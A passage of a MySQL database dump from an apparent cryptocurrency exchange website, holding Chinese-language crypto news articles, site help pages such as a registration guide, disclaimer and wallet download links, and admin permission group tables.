“如果你有一个数字美元和一个数字货币，那么他们是可以与您钱包里面的金钱互换的，那么你就会愿意在日常生活中使用这些数字货币”</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 虽然加密货币到目前为止只在分散化的区块链的协议，私人企业发行前发行，但她认为，央行的发行不仅可以提到资产的流动性还会催生一个新市场的出现。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 例如，花旗集团旗下CitiConnect希望简化私人资产市场的购买和出售，但在这种交易中使用加密货币，可以让区块链的流动性引入到更广泛的范围内，从而实现区块链的价值。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 只有在政府支持的加密货币等正确机制的基础上，市场上才会出现新兴市场。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; McKenney说：“如果您认为自己的资产最后会在区块链内赔掉，想要交换、卖掉或者购买它们，那么你就需要一种可以在这个生态系统中起作用的支付机制。”</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 例如，目前，私人市场证券和其它资产所有权记录主要由律师和受信任的第三方持有，这就要求中间人进行交易。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 花旗集团为了实现这一过程的现代化，已经与纳斯达克和区块链初创公司联手推出CitiConnect，麦肯尼称其为“通往区块链的桥梁”。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 该平台目的是将现有的金融轨道与区块状链连接起来，从而可以使法定货币来实现使用链分布式帐本技术的效率。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 她说，如果州政府可以在区块链上发行法定货币，他们就会对这项技术进行改进并收取高额的费用，这样就可以在区块链上与其它加密货币进行交易。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 除了考虑CitiConnect平台潜在的其他合作机会外，该银行还投资了Chain，DigitalAssetHoldings和Axoni，这三家公司都提高了区块链解决方案，但这并不包括原生的加密货币。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 麦肯尼说，虽然花旗没有在国家支持的数字货币之外探索加密货币”，但她为未来可能与加密货币相关项目敞开了大门。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; “我不想声明我们明确排除了任何东西，不过我们会采取一种有效的方法，这可以反映出区块链和其它技术的早期阶段”</span>\r\n</p>', '', '1', 'ccc', '0', '1', '1', '1', '1512398707', '1512230400', '0');
INSERT INTO `movesay_article` VALUES ('85', '以太坊基金会与俄罗斯国家开发银行正式签署合作协议，创建俄罗斯以太坊专家社区和项目', '', '<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp;以太坊基金会是一个致力于支持以太坊协议发展的非盈利机构，该机构已经与俄罗斯国家开发银行（VEB）签署了一项合作协议。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 双方在昨日正式发布了一份联合声明，以太坊基金会将与VEB共同支持一个新的区块链研究中心，为专业人员提供分布式账本技术和以太坊平台培训。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 这次合作旨在希望帮助推动在俄罗斯创建一个以太坊专家社区以及协助创建基于以太坊和其他区块链的项目。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 以太坊创始人VitalikButerin在声明中表示：</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; “以太坊与VEB的合作创造了一个独一无二的机会来参与区块链技术用于公共管理方面的研发，以及加快这种技术适用于俄罗斯联邦的政府组织。”</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 这次正式合作是在Tatarstan举办的一场“区块链：俄罗斯的新石油”区块链活动上签署的。VEB高级官员以及Buterin出席并发表讲话。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 这次合作是俄罗斯正在采取的一系列区块链实施的一部分。</span>\r\n</p>\r\n<div>\r\n	<br />\r\n</div>', '', '1', 'ccc', '0', '1', '1', '1', '1512398747', '1511712000', '0');
INSERT INTO `movesay_article` VALUES ('86', 'Telegram创始人：加密货币能让我们摆脱美国霸权', '', '<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">信息服务商Telegram的创始人PavelDurov将加密货币视为世界金融系统脱离美国主导状态的一次机会。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; Durov在社交网络平台Vkontakte中评论了近期俄罗斯财政部计划禁止个人比特币交易的消息。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 我不太清楚俄罗斯官员限制比特币购买的意义在哪里。这70年以来，世界金融系统第一次有了摆脱美国霸权的机会。自70年前开始，美国将其国家货币打造成了世界储备货币。自那时起，美国实际上就在从所有国家收集‘贡税’。世界上其他国家需要以美元形式支付债务并购买资产。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 而俄罗斯大可以与日本和其它亚洲国家一起抓住这次机会认可数字货币的地位，创造更加平衡的世界，取代美元，但他们却口口声声说要‘禁止并限制比特币’。似乎给俄罗斯实施经济制裁的是比特币。</span>\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p style=\"color:#666666;font-family:&quot;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-family:微软雅黑, &quot;font-size:14px;\">&nbsp; &nbsp; 据巴比特报道，俄罗斯财政部副部长AlexeyMoiseev透露，他们正在研究个人比特币买卖禁令的可能性。财政部建议将加密货币视为金融资产，并在莫斯科证券交易所出售，由该国金融监管部门Rosfinmonitoring控制。另外，只有合格投资者能够进行加密货币买卖。</span>\r\n</p>\r\n<div>\r\n	<br />\r\n</div>', '', '1', 'ccc', '0', '1', '1', '1', '1512398801', '1511625600', '0');
INSERT INTO `movesay_article` VALUES ('87', '瑞士监管部门发行金融执照，首家比特币合规企业出炉', '', '<p style=\"color:#555555;font-family:\"font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:\"\">支付网关Payment21的所属公司成为了第一家获得瑞士金融监管者批准且完全合规的比特币</span><span style=\"color:#333333;font-size:14px;font-family:\"\">公司。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:\"font-size:18px;background-color:#FFFFFF;\">\r\n	<a href=\"http://7fvhfe.com1.z0.glb.clouddn.com/wp-content/uploads/2017/10/201710200252534634.jpg\"><img class=\"alignnone size-full wp-image-143208\" alt=\"bitcoin regulation\" src=\"http://7fvhfe.com1.z0.glb.clouddn.com/wp-content/uploads/2017/10/201710200252534634.jpg\" width=\"750\" height=\"450\" style=\"height:auto;\" /></a>\r\n</p>\r\n<p style=\"color:#555555;font-family:\"font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:\"\">本周二，Moving Media宣布其获得了直属金融中介（DSFI）执照。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:\"font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:\"\">这代表了其在瑞士金融市场监管局（FINMA）的监管下，成为了在AML（反洗钱）和KYC（了解你的客户）方面完全合规的企业。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:\"font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:\"\">Moving Media表示，他们在经过“一年多的努力和投入”之后才获得了这个执照。该公司总经理Bernhard Kaufmann说：</span>\r\n</p>\r\n<blockquote style=\"background:#F3F5F9;color:#555555;font-family:\"font-size:18px;\">\r\n	<p style=\"color:#666666;font-size:12px;font-family:\"\">\r\n		<span style=\"color:#333333;font-size:14px;\">我们一直致力于满足进入瑞士金融市场的法律要求。我们对合规问题的处理丰富了整个数字货币生态系统，同时也证明了瑞士监管部门对金融服务领域竞争性的包容态度，他们是真心鼓励数字时代金融技术创新的。</span>\r\n	</p>\r\n</blockquote>\r\n<p style=\"color:#555555;font-family:\"font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:\"\">Kaufmann的积极态度就代表了当前瑞士比特币市场的情绪，不仅仅是加密货币爱好者，就连传统投资者也开始进入这一领域。</span>\r\n</p>\r\n<p style=\"color:#555555;font-family:\"font-size:18px;background-color:#FFFFFF;\">\r\n	<span style=\"color:#333333;font-size:14px;font-family:\"\">瑞士已经有两家银行在7月推出比特币和以太坊交易敞口，同时，对监管政策的重新定位以及鼓励为某些地区的民众提供了更多与加密货币直接互动的选择。Kaufmann补充道：</span>\r\n</p>\r\n<blockquote style=\"background:#F3F5F9;color:#555555;font-family:\"font-size:18px;\">\r\n	<p style=\"color:#666666;font-size:12px;font-family:\"\">\r\n		<span style=\"color:#333333;font-size:14px;\">对于支付企业来说，政府的许可证是很重要的。在竞争环境中，能够获得瑞士等欧洲顶尖金融中心政府的认可是一个关键优势。</span>\r\n	</p>\r\n</blockquote>', '', '1', 'game', '0', '1', '1', '1', '1512398863', '1511625600', '0');
INSERT INTO `movesay_article` VALUES ('88', '重大升级的通知', '', '<p>\r\n	尊敬的交易平台的用户：\r\n</p>\r\n<p>\r\n	我们抱歉的通知大家，我们技术团队每时每刻都在保护网站安全，我们保证网站365*24均可正常访问以及正常交易，我们每一次均通过在线升级，在线升级技术难度较大，可能在用户访问偶尔卡顿，数据加载缓慢属于正常现象，希望用户知晓及包容！\r\n</p>', '', '1', 'us', '0', '1', '1', '0', '1513764541', '1513699200', '0');

-- ----------------------------
-- Table structure for `movesay_article_type`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_article_type`;
CREATE TABLE `movesay_article_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET utf8 NOT NULL,
  `title` varchar(50) CHARACTER SET utf8 NOT NULL,
  `en_title` varchar(50) CHARACTER SET utf8 DEFAULT NULL,
  `remark` varchar(50) CHARACTER SET utf8 NOT NULL,
  `index` varchar(50) CHARACTER SET utf8 NOT NULL,
  `footer` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `shang` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `en_content` text CHARACTER SET utf8,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_article_type
-- ----------------------------
INSERT INTO `movesay_article_type` VALUES ('1', 'us', 'Introduction', '', '行业资讯', '0', '1', 'aboutus', '<br />\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"color:#999999;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:center;text-indent:0px;background-color:#F9F9F9;\">\r\n	<br />\r\n</p>', '', '1', '1506681795', '1506681791', '0');
INSERT INTO `movesay_article_type` VALUES ('2', 'xiazai', '下载中心', null, '最新公告', '0', '1', '', '', null, '3', '0', '0', '0');
INSERT INTO `movesay_article_type` VALUES ('4', 'aboutus', '关于我们', 'About US', '关于我们', '0', '1', '', '', '', '1', '1506700800', '1478707200', '0');
INSERT INTO `movesay_article_type` VALUES ('5', 'contact', '联系我们', null, '', '0', '1', 'aboutus', '<p class=\"contact-item\" style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	客服电话：400-888-8888\r\n</p>\r\n<p class=\"contact-item\" style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	联系邮箱：1111111@ofc.com\r\n</p>\r\n<p class=\"contact-item\" style=\"color:#666666;font-family:\'Microsoft YaHei\', Arial, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:left;text-indent:0px;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<br />', null, '2', '1476096419', '1476096420', '0');
INSERT INTO `movesay_article_type` VALUES ('6', 'join', '加入我们', '', '', '0', '0', 'aboutus', '<br class=\"Apple-interchange-newline\" />', '', '4', '1506855244', '1476096845', '0');
INSERT INTO `movesay_article_type` VALUES ('8', 'game', ' Disclaimer', '', '', '0', '0', 'help', '<p style=\"color:#333333;font-family:\'Open Sans Regular\', \'Open Sans\', \'Helvetica Neue\', Helvetica, Arial, \'PingFang SC\', \'Microsoft Yahei\', 微软雅黑, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	<br />\r\n</p>\r\n<p class=\"MsoNormal\" style=\"margin-left:0cm;background:white;\">\r\n	This statement applies to the operation of the Internet trading platform to provide or run services (including web sites and mobile applications). Internet trading platform, the following collectively referred to as \"the United States.\"<br />\r\nPlease ensure that you read and understand the following statements before using the Internet service.<br />\r\nNo trust responsibility, no investment proposal, no investment to attract<br />\r\nThe United States has no fiduciary responsibility for customers using its services. In addition, the Intranet expressly reserves the right to change the prices or product composition of its services at any time.<br />\r\nThe information provided by the Service does not constitute an investment offer or solicitation for the purchase or disposal of financial assets. Investors can not rely on this information to make investment decisions.<br />\r\nNo warranty, no liability<br />\r\nWhile the United States endeavors to provide accurate and timely information on its Web site, it does not imply that the United States Network provides security for any material that it provides.<br />\r\nWithout prejudice to the above paragraphs, the Internet does not guarantee the following:<br />\r\nThe information provided by the Internet service will remain in perpetuity or permanent.<br />\r\nThe information provided by the Internet service is complete, true, accurate, current or not misleading.<br />\r\nYou should not delay seeking legal advice, disregarding legal advice, or starting or stopping any legal action due to information provided by the Internet service.<br />\r\nresponsibility<br />\r\nThis Legal Notice does not in any way limit any liability of the United States network beyond applicable law or excludes any liability of the United States network that may not be outside the applicable law.<br />\r\nlink<br />\r\nLinks to third-party websites are provided for convenience only. The Intranet does not express any opinion on the content of any third-party web site and expressly disclaims any responsibility or liability for any third-party information. If you use the links provided in the Internet service to any other website, you are entirely at your own risk.<br />\r\ntrademark<br />\r\nAll trademarks mentioned are the property of, or available under, the network.<br />\r\ncopyright<br />\r\nInformation on the Internet service and its inclusion and references are provided for informational purposes only. Any reproduction, forwarding or other use is strictly prohibited. You should seek out the business development contact form and provide the relevant request on the Internet page.\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"color:#333333;font-family:\'Open Sans Regular\', \'Open Sans\', \'Helvetica Neue\', Helvetica, Arial, \'PingFang SC\', \'Microsoft Yahei\', 微软雅黑, sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	<span class=\"Apple-converted-space\"></span> \r\n</p>', '', '5', '1476097143', '1476097145', '0');
INSERT INTO `movesay_article_type` VALUES ('10', 'a', 'Registration Guide', '', '', '0', '0', 'help', '<p>\r\n	<span style=\"color:#666666;font-family:tahoma,\" font-size:14px;font-style:normal;font-weight:normal;line-height:24px;background-color:#ffffff;\"=\"\"></span>\r\n</p>\r\n<p style=\"margin-left:0cm;\">\r\n	1. Open the homepage of the trading platform, click 【Register】 or 【Free Registration】 to enter the registration page. Register a new account or bind an existing account.<br />\r\n2. Fill in the common e-mail (for login and retrieve password), login password (need to set more than 6), invitation code, and carefully read the \"Registration Agreement\", click 【Next】. Note: The invitation code is optional. Fill in the transaction password (fill in more than 6, and the login password is different), click [Next] after confirmation.<br />\r\n3. Fill in the transaction password (fill in more than 6, and with the login password is different), click [Next] after confirmation.<br />\r\n4. According to the relevant provisions of the state, the US Internet users need to register real-name registration.<br />\r\nPlease select the type of document (default ID card, passport / officer card / Hong Kong and Macau Pass), and then click [Next] after inputting the real ID information of the user (the file information can not be modified after registration).<br />\r\nNote: Bank card information should be the same with the identity information, please fill out the true identity information, so as not to inconvenience<br />\r\n5. Register successfully. After the account can be directly charged and transactions.\r\n</p>\r\n<p>\r\n	<span style=\"color:#666666;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:12px;font-style:normal;font-weight:normal;line-height:24px;background-color:#FFFFFF;\"><br />\r\n</span> \r\n</p>', '', '1', '1506825836', '1476153838', '0');
INSERT INTO `movesay_article_type` VALUES ('15', 'aa', 'Wallet Download ', '', '', '0', '1', 'xiazai', '<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"> </span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><img src=\"http://ofc.ziyuan800.com/Upload/article/580436135bb2a.png\" alt=\"\" width=\"52\" height=\"52\" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BITCOIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"https://bitcoin.org/en/\" target=\"_blank\"><span id=\"result_box\" class=\"short_text\"><span class=\"\">Wallet download</span></span></a><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><img src=\"http://ofc.ziyuan800.com/Upload/article/57fc4b01d610d.jpg\" alt=\"\" />&nbsp;&nbsp;&nbsp;&nbsp; LITECOIN &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"https://litecoin.org/zh_CN/\" target=\"_blank\"><span id=\"result_box\" class=\"short_text\"><span class=\"\">Wallet download</span></span></a>&nbsp; <br />\r\n</span> \r\n</p>\r\n<p>\r\n	<span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\"><br />\r\n</span> \r\n</p>\r\n<p>\r\n	<img src=\"http://ofc.ziyuan800.com/Upload/article/58043670dcb89.png\" alt=\"\" width=\"55\" height=\"55\" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"font-size:14px;\"> ETHERIUM&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href=\"http://coinmarketcap.com/currencies/ethereum/\" target=\"_blank\"><span style=\"font-size:14px;\"><span id=\"result_box\" class=\"short_text\"><span class=\"\">Wallet download</span></span></span></a> \r\n</p>', '', '1', '1506825159', '1476153162', '0');
INSERT INTO `movesay_article_type` VALUES ('16', 'bb', 'Explorer Download', '', '', '0', '0', 'xiazai', '<p>\r\n	<img src=\"/Upload/article/57fc489875734.jpg\" alt=\"\" />    <span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\">FireFox 火狐浏览器</span>     <a href=\"http://www.firefox.com.cn/\" target=\"_blank\"><span style=\"font-size:14px;\"><span id=\"result_box\" class=\"short_text\"><span><span id=\"result_box\" class=\"short_text\"><span class=\"\">Download the official website</span></span></span><span class=\"\"></span></span></span><br />\r\n</a> \r\n</p>\r\n<p>\r\n	<img src=\"/Upload/article/57fc48bd5f44e.jpg\" alt=\"\" />    <span style=\"color:#333333;font-family:tahoma, \'Microsoft YaHei\', Arial, Helvetica, sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:normal;background-color:#FFFFFF;\">Chrome 谷歌浏览器     <a href=\"https://www.google.com/intl/zh-CN/chrome/browser/\" target=\"_blank\"><span id=\"result_box\" class=\"short_text\"><span><span id=\"result_box\" class=\"short_text\"><span class=\"\">Download the official website</span></span></span><span class=\"\"></span></span></a></span><br />\r\n<a href=\"http://www.firefox.com.cn/\" target=\"_blank\"></a> \r\n</p>', '', '2', '1506823622', '1476151627', '0');
INSERT INTO `movesay_article_type` VALUES ('18', 'dd', '工具下载', null, '', '0', '0', 'xiazai', '测试数据', null, '4', '1476154986', '1476154987', '0');
INSERT INTO `movesay_article_type` VALUES ('19', 'aaa', 'Notice', null, '', '1', '0', '', '', null, '1', '0', '0', '0');
INSERT INTO `movesay_article_type` VALUES ('20', 'bbb', '新闻公告', 'News bulletin', '', '1', '0', '', '', '', '2', '1506828347', '1476156351', '0');
INSERT INTO `movesay_article_type` VALUES ('21', 'ccc', '行业资讯', 'Industry information', '', '1', '0', '', '', '', '3', '1512576000', '1512576000', '0');

-- ----------------------------
-- Table structure for `movesay_auth_extend`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_extend`;
CREATE TABLE `movesay_auth_extend` (
  `group_id` mediumint(10) unsigned NOT NULL COMMENT '用户id',
  `extend_id` mediumint(8) unsigned NOT NULL COMMENT '扩展表中数据的id',
  `type` tinyint(1) unsigned NOT NULL COMMENT '扩展类型标识 1:栏目分类权限;2:模型权限',
  UNIQUE KEY `group_extend_type` (`group_id`,`extend_id`,`type`),
  KEY `uid` (`group_id`),
  KEY `group_id` (`extend_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_extend
-- ----------------------------
INSERT INTO `movesay_auth_extend` VALUES ('1', '1', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '1', '2');
INSERT INTO `movesay_auth_extend` VALUES ('1', '2', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '2', '2');
INSERT INTO `movesay_auth_extend` VALUES ('1', '3', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '3', '2');
INSERT INTO `movesay_auth_extend` VALUES ('1', '4', '1');
INSERT INTO `movesay_auth_extend` VALUES ('1', '37', '1');

-- ----------------------------
-- Table structure for `movesay_auth_group`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_group`;
CREATE TABLE `movesay_auth_group` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT COMMENT '用户组id,自增主键',
  `module` varchar(20) NOT NULL COMMENT '用户组所属模块',
  `type` tinyint(4) NOT NULL COMMENT '组类型',
  `title` char(20) NOT NULL DEFAULT '' COMMENT '用户组中文名称',
  `description` varchar(80) NOT NULL DEFAULT '' COMMENT '描述信息',
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '用户组状态：为1正常，为0禁用,-1为删除',
  `rules` varchar(500) NOT NULL DEFAULT '' COMMENT '用户组拥有的规则id，多个规则 , 隔开',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_auth_group
-- ----------------------------
INSERT INTO `movesay_auth_group` VALUES ('12', 'admin', '1', '超级管理员', '', '1', '1710,1711,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1781,1782,1787,1790,1791,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1810,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,1826,1827,');
INSERT INTO `movesay_auth_group` VALUES ('11', 'admin', '1', '客服', '', '1', '1710,1711,1713,1714,1715,1716,1717,1718,1719,1720,1726,1727,1728,1729,1730,1731,1732,1736,1738,1739,1740,1741,1742,1743,1744,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1782,1787,1794,1796,1797,1798,1799,1800,1803,1807,1810,1817,1819,1820,1821,1842,1844,1845,1846,1847,1866,1868,1869,1875,1877,1878,1879,1884,1885,1887,1888,1890,1891,1896');

-- ----------------------------
-- Table structure for `movesay_auth_group_access`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_auth_group_access`;
CREATE TABLE `movesay_auth_group_access` (
  `uid` int(10) unsigned NOT NULL COMMENT '用户id',
  `group_id` mediumint(8) unsigned NOT NULL COMMENT '用户组id',
  UNIQUE KEY `uid_group_id` (`uid`,`group_id`),
